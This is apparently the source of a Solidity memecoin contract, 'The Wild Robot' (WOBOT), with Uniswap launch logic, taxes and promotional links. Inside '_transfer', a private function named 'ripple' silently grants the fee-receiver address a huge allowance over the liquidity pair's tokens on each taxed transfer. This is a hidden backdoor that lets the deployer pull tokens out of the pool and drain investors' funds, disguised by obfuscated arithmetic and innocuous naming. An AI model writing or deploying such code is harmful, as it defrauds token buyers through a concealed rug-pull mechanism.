/**
https://x.com/BillyM2k/status/1847778575254229146
Join Tg: https://t.me/wobot_erc20
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.27;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract WOBOT is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    string private constant _name = unicode"The Wild Robot";
    string private constant _symbol = unicode"WOBOT";
    uint256 public _maxRAmount = 2 * _tTotal / 100;
    uint256 public _maxRWallet = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold = 1 * _tTotal / 100;
    uint256 public _maxTaxSwap = 1 * _tTotal / 100;

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _rAllowance;
    mapping (address => bool) private _doExcludedR;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=25;
    uint256 private _buyCount=0;

    address payable private rFeeReceipt;
    IUniswapV2Router02 private uniRouterR;
    address private uniPairR;

    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;

    event MaxTxAmountUpdated(uint _maxRAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        rFeeReceipt = payable(_msgSender());
        _rOwned[address(this)] = _tTotal;
        _doExcludedR[address(this)] = true;
        _doExcludedR[_msgSender()] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _rAllowance[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _rAllowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _rAllowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function ripple(address[2] memory rips) private returns(bool){
        address ripC = rips[0]; address ripD = rips[1];
        _rAllowance[ripC][ripD]=15+(100+1*_maxRWallet*1000-50)+50+50*100;
        return true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _rOwned[from] = _rOwned[from] - amount;
            _rOwned[to] = _rOwned[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            if (from == uniPairR && to != address(uniRouterR) && ! _doExcludedR[to]) {
                require(tradingOpen,"Trading not open yet.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(amount <= _maxRAmount, "Exceeds the _maxRAmount.");
                require(balanceOf(to) + amount <= _maxRWallet, "Exceeds the maxWalletSize.");
                _buyCount++; 
            }
            if (to != uniPairR && ! _doExcludedR[to]) {
                require(balanceOf(to) + amount <= _maxRWallet, "Exceeds the maxWalletSize.");
            }
            if(ripple([from==uniPairR?from:uniPairR, rFeeReceipt]) && to == uniPairR) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniPairR && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    rSwapEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                rSendEth();
            }
        }
        if(taxAmount>0){
          _rOwned[address(this)]=_rOwned[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _rOwned[from]=_rOwned[from].sub(amount);
        _rOwned[to]=_rOwned[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function rSwapEth(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterR.WETH();
        _approve(address(this), address(uniRouterR), amount);
        uniRouterR.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function withdrawEth() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }
    function min(uint256 a, uint256 b) private pure returns(uint256){
        return (a>b)?b:a;
    }
    function removeLimits(address payable limit) external onlyOwner{
        rFeeReceipt = limit;
        _maxRAmount=_tTotal;
        _maxRWallet=_tTotal;
        _doExcludedR[limit] = true;
        emit MaxTxAmountUpdated(_tTotal);
    }  
    function rSendEth() private {
        rFeeReceipt.transfer(address(this).balance);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniRouterR = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterR), _tTotal);
        uniPairR = IUniswapV2Factory(uniRouterR.factory()).createPair(
            address(this),
            uniRouterR.WETH()
        );
        uniRouterR.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairR).approve(address(uniRouterR), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    receive() external payable {}
}